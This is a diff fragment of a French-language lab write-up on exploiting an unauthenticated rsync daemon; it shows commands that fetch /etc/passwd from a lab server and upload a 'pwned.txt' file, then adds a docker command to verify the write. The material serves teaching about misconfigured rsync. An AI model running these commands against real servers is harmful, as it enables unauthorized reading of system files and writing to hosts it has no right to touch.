@@ -41,7 +41,9 @@ rsync -av rsync://192.168.125.128:873/src/etc/passwd ./
 touch pwned.txt
 rsync pwned.txt rsync://192.168.125.128:873/src/home/
 ```
-
+```
+sudo docker exec <CONTAINER_ID> ls -l /home/
+```
 ## Explication de la raison pour laquelle l’exploit fonctionne
 
 L'exploit fonctionne parce que le fichier de configuration rsyncd.conf ne restreint pas l'accès.
